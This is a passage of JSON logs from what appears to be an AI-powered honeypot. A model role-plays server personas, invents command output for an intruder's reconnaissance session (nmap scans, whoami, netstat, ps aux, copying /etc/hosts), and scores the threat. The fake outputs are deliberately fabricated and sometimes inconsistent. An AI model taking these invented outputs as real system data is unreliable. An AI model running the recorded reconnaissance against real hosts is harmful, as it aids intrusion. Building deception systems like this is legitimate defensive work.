            "mv /tmp/hosts_bak /tmp/hosts_new"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:12:39,367 - {"session_id": "71dd20b2", "command": "mv /tmp/hosts_bak /tmp/hosts_new", "attack_type": "Unknown", "risk_score": 64, "threat_level": "HIGH"}
2026-07-21 11:12:39,367 - {
    "session_id": "71dd20b2",
    "command": "mv /tmp/hosts_bak /tmp/hosts_new",
    "ai_decision": "[Guardrail] No valid response generated.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 32
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 64,
    "threat_level": "HIGH"
}
2026-07-21 11:12:39,367 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: mv /tmp/hosts_bak /tmp/hosts_new",
    "ai_decision": "[Guardrail] No valid response generated.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:12:52,980 - {
    "session_id": "71dd20b2",
    "query": "rm /tmp/hosts_new",
    "response": "[Guardrail] No valid response generated.",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 65,
        "risk_level": "HIGH",
        "final_score": 65,
        "threat_level": "HIGH",
        "base_score": 65,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 33,
            "unique_commands": 30,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 375,
            "commands_executed": 33,
            "successful_commands": 32,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 65,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:12:52,980 - {"session_id": "71dd20b2", "command": "rm /tmp/hosts_new", "attack_type": "Unknown", "risk_score": 65, "threat_level": "HIGH"}
2026-07-21 11:12:52,980 - {
    "session_id": "71dd20b2",
    "command": "rm /tmp/hosts_new",
    "ai_decision": "[Guardrail] No valid response generated.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 33
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 65,
    "threat_level": "HIGH"
}
2026-07-21 11:12:52,980 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: rm /tmp/hosts_new",
    "ai_decision": "[Guardrail] No valid response generated.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:13:08,552 - {
    "session_id": "71dd20b2",
    "query": "df -h",
    "response": "Filesystem     1K-blocks    Used Available Use% Mounted on\nudev              973244       0    973244   0% /dev\ntmpfs             198432    1240    197192   1% /run\n/dev/sda1       25312384 4567120  19745264  19% /\ntmpfs             992160       0    992160   0% /dev/shm\ntmpfs               5120       4      5116   1% /run/lock\n/dev/sda15        104832    5324     99508   6% /boot/efi\n\n**SECURITY NOTICE:** This system is for authorized personnel only. All activities are being monitored and recorded.",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 66,
        "risk_level": "HIGH",
        "final_score": 66,
        "threat_level": "HIGH",
        "base_score": 66,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 34,
            "unique_commands": 31,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 389,
            "commands_executed": 34,
            "successful_commands": 33,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 66,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:13:08,552 - {"session_id": "71dd20b2", "command": "df -h", "attack_type": "Unknown", "risk_score": 66, "threat_level": "HIGH"}
2026-07-21 11:13:08,552 - {
    "session_id": "71dd20b2",
    "command": "df -h",
    "ai_decision": "Filesystem     1K-blocks    Used Available Use% Mounted on\nudev              973244       0    973244   0% /dev\ntmpfs             198432    1240    197192   1% /run\n/dev/sda1       25312384 4567120  19745264  19% /\ntmpfs             992160       0    992160   0% /dev/shm\ntmpfs               5120       4      5116   1% /run/lock\n/dev/sda15        104832    5324     99508   6% /boot/efi\n\n**SECURITY NOTICE:** This system is for authorized personnel only. All activities are being monitored and recorded.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 34
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 66,
    "threat_level": "HIGH"
}
2026-07-21 11:13:08,552 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: df -h",
    "ai_decision": "Filesystem     1K-blocks    Used Available Use% Mounted on\nudev              973244       0    973244   0% /dev\ntmpfs             198432    1240    197192   1% /run\n/dev/sda1       25312384 4567120  19745264  19% /\ntmpfs             992160       0    992160   0% /dev/shm\ntmpfs               5120       4      5116   1% /run/lock\n/dev/sda15        104832    5324     99508   6% /boot/efi\n\n**SECURITY NOTICE:** This system is for authorized personnel only. All activities are being monitored and recorded.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:13:23,089 - {
    "session_id": "71dd20b2",
    "query": "du -sh /var/log",
    "response": "Warning: Filesystem access detected. Monitoring for potential security risks.\n\ndu -sh /var/log\n\n4.0K    /var/log\n4.0K    total",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 67,
        "risk_level": "HIGH",
        "final_score": 67,
        "threat_level": "HIGH",
        "base_score": 67,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 35,
            "unique_commands": 32,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 404,
            "commands_executed": 35,
            "successful_commands": 34,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 67,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:13:23,089 - {"session_id": "71dd20b2", "command": "du -sh /var/log", "attack_type": "Unknown", "risk_score": 67, "threat_level": "HIGH"}
2026-07-21 11:13:23,089 - {
    "session_id": "71dd20b2",
    "command": "du -sh /var/log",
    "ai_decision": "Warning: Filesystem access detected. Monitoring for potential security risks.\n\ndu -sh /var/log\n\n4.0K    /var/log\n4.0K    total",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 35
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 67,
    "threat_level": "HIGH"
}
2026-07-21 11:13:23,093 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: du -sh /var/log",
    "ai_decision": "Warning: Filesystem access detected. Monitoring for potential security risks.\n\ndu -sh /var/log\n\n4.0K    /var/log\n4.0K    total",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:13:37,680 - {
    "session_id": "71dd20b2",
    "query": "ps aux",
    "response": "USER=root COMMAND=/bin/ps aux\n\nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx\n\n[2023-12-01 12:00:00] AUDIT LOG: Command executed by root: ps aux\n\n[2023-12-01 12:00:00] AUDIT LOG: Output: \nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 71,
        "risk_level": "CRITICAL",
        "final_score": 71,
        "threat_level": "CRITICAL",
        "base_score": 71,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 36,
            "unique_commands": 33,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 419,
            "commands_executed": 36,
            "successful_commands": 35,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 71,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:13:37,681 - {"session_id": "71dd20b2", "command": "ps aux", "attack_type": "Network/User Enumeration", "risk_score": 71, "threat_level": "CRITICAL"}
2026-07-21 11:13:37,681 - {
    "session_id": "71dd20b2",
    "command": "ps aux",
    "ai_decision": "USER=root COMMAND=/bin/ps aux\n\nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx\n\n[2023-12-01 12:00:00] AUDIT LOG: Command executed by root: ps aux\n\n[2023-12-01 12:00:00] AUDIT LOG: Output: \nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 36
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 71,
    "threat_level": "CRITICAL"
}
2026-07-21 11:13:37,681 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ps aux",
    "ai_decision": "USER=root COMMAND=/bin/ps aux\n\nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx\n\n[2023-12-01 12:00:00] AUDIT LOG: Command executed by root: ps aux\n\n[2023-12-01 12:00:00] AUDIT LOG: Output: \nUSER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       221  0.0  0.2 sshd\nmysql      334  0.4  1.3 mysqld\nwww-data   510  0.1  0.3 nginx",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Network/User Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:01,538 - {
    "session_id": "71dd20b2",
    "query": "top -b -n 1",
    "response": "15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 72,
        "risk_level": "CRITICAL",
        "final_score": 72,
        "threat_level": "CRITICAL",
        "base_score": 72,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 37,
            "unique_commands": 34,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 434,
            "commands_executed": 37,
            "successful_commands": 36,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 72,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:01,538 - {"session_id": "71dd20b2", "command": "top -b -n 1", "attack_type": "Unknown", "risk_score": 72, "threat_level": "CRITICAL"}
2026-07-21 11:14:01,538 - {
    "session_id": "71dd20b2",
    "command": "top -b -n 1",
    "ai_decision": "15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 37
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 72,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:01,538 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: top -b -n 1",
    "ai_decision": "15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:15,123 - {
    "session_id": "71dd20b2",
    "query": "free -m",
    "response": "Mem:        2032048      319840     1274932        1240      437276     1548480\nSwap:       2097148           0     2097148",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 73,
        "risk_level": "CRITICAL",
        "final_score": 73,
        "threat_level": "CRITICAL",
        "base_score": 73,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 38,
            "unique_commands": 35,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 457,
            "commands_executed": 38,
            "successful_commands": 37,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 73,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:15,123 - {"session_id": "71dd20b2", "command": "free -m", "attack_type": "Unknown", "risk_score": 73, "threat_level": "CRITICAL"}
2026-07-21 11:14:15,123 - {
    "session_id": "71dd20b2",
    "command": "free -m",
    "ai_decision": "Mem:        2032048      319840     1274932        1240      437276     1548480\nSwap:       2097148           0     2097148",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 38
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 73,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:15,123 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: free -m",
    "ai_decision": "Mem:        2032048      319840     1274932        1240      437276     1548480\nSwap:       2097148           0     2097148",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:31,386 - {
    "session_id": "71dd20b2",
    "query": "systemctl status ssh",
    "response": "UNIT                         LOAD   ACTIVE SUB     DESCRIPTION\n  sys-devices-virtual-net-eth0.device loaded active plugged /sys/devices/virtual/net/eth0\n  cron.service                 loaded active running Regular background program processing daemon\n  dbus.service                 loaded active running D-Bus System Message Bus\n  mysql.service                loaded active running MySQL Community Server\n  nginx.service                loaded active running A high performance web server and a reverse proxy server\n  ssh.service                  loaded active running OpenBSD Secure Shell server",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 74,
        "risk_level": "CRITICAL",
        "final_score": 74,
        "threat_level": "CRITICAL",
        "base_score": 74,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 39,
            "unique_commands": 36,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 471,
            "commands_executed": 39,
            "successful_commands": 38,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 1,
            "engagement_score": 73,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 74,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:31,386 - {"session_id": "71dd20b2", "command": "systemctl status ssh", "attack_type": "Unknown", "risk_score": 74, "threat_level": "CRITICAL"}
2026-07-21 11:14:31,386 - {
    "session_id": "71dd20b2",
    "command": "systemctl status ssh",
    "ai_decision": "UNIT                         LOAD   ACTIVE SUB     DESCRIPTION\n  sys-devices-virtual-net-eth0.device loaded active plugged /sys/devices/virtual/net/eth0\n  cron.service                 loaded active running Regular background program processing daemon\n  dbus.service                 loaded active running D-Bus System Message Bus\n  mysql.service                loaded active running MySQL Community Server\n  nginx.service                loaded active running A high performance web server and a reverse proxy server\n  ssh.service                  loaded active running OpenBSD Secure Shell server",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 39
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 74,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:31,386 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: systemctl status ssh",
    "ai_decision": "UNIT                         LOAD   ACTIVE SUB     DESCRIPTION\n  sys-devices-virtual-net-eth0.device loaded active plugged /sys/devices/virtual/net/eth0\n  cron.service                 loaded active running Regular background program processing daemon\n  dbus.service                 loaded active running D-Bus System Message Bus\n  mysql.service                loaded active running MySQL Community Server\n  nginx.service                loaded active running A high performance web server and a reverse proxy server\n  ssh.service                  loaded active running OpenBSD Secure Shell server",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,127 - {
    "session_id": "71dd20b2",
    "query": "dmesg | tail",
